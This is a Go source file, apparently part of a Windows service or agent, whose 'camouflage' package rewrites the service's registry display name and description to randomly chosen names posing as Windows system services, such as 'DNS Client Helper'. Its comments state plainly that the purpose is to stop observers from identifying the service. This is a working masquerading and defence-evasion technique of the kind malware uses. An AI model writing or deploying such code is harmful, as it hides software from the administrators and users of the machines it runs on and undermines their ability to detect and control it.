//go:build windows

// Package camouflage implements service display-name randomisation on Windows.
//
// When running as a Windows service the SCM (Service Control Manager) stores the
// service's display name and description in the registry under:
//
//	HKLM\SYSTEM\CurrentControlSet\Services\<name>
//
// By overwriting those values with a benign-sounding string we make it harder
// for a casual observer browsing services.msc to identify our service.
//
// Java analogy: there is no direct Java equivalent – this is a Windows-specific
// registry operation.  The closest analogy would be changing a JMX MBean display
// name, but that only affects JVM tooling, not the OS service manager.
package camouflage

import (
	"log/slog"
	"math/rand"

	"golang.org/x/sys/windows/registry"
)

// displayNames is a pool of generic, legitimate-sounding service display names.
var displayNames = []string{
	"Windows Network Helper",
	"System Configuration Service",
	"Network Connectivity Assistant",
	"DNS Client Helper",
	"Local Network Monitor",
}

// descriptions is a matching pool of plausible service descriptions.
var descriptions = []string{
	"Provides network connectivity and configuration services.",
	"Manages system network settings for local area connections.",
	"Monitors and assists with DNS name resolution on the local machine.",
	"Provides helper functionality for network client applications.",
	"Maintains local network configuration state for system services.",
}

// Randomize updates the Windows service registry entries for the named service
// with randomly selected display name and description strings.
//
// This function requires the process to be running as SYSTEM or Administrator
// because it writes to HKLM (HKEY_LOCAL_MACHINE).
func Randomize(serviceName string) {
	log := slog.Default().With("component", "camouflage")

	if serviceName == "" {
		log.Warn("camouflage skipped – service name is empty")
		return
	}

	// Open the service's registry key for writing.
	// registry.LOCAL_MACHINE = HKEY_LOCAL_MACHINE in Windows terminology.
	keyPath := `SYSTEM\CurrentControlSet\Services\` + serviceName
	key, err := registry.OpenKey(registry.LOCAL_MACHINE, keyPath, registry.SET_VALUE)
	if err != nil {
		// Non-fatal: the service key might not exist yet if we are running
		// outside the SCM (e.g. first-run before service installation).
		log.Warn("camouflage skipped – cannot open service registry key",
			"path", keyPath,
			"error", err,
		)
		return
	}
	defer key.Close() // Always release handles – like closing a Java FileChannel.

	displayName := displayNames[rand.Intn(len(displayNames))]
	description := descriptions[rand.Intn(len(descriptions))]

	if err := key.SetStringValue("DisplayName", displayName); err != nil {
		log.Error("set DisplayName failed", "error", err)
	}
	if err := key.SetStringValue("Description", description); err != nil {
		log.Error("set Description failed", "error", err)
	}

	log.Info("service display name randomised",
		"service", serviceName,
		"displayName", displayName,
	)
}
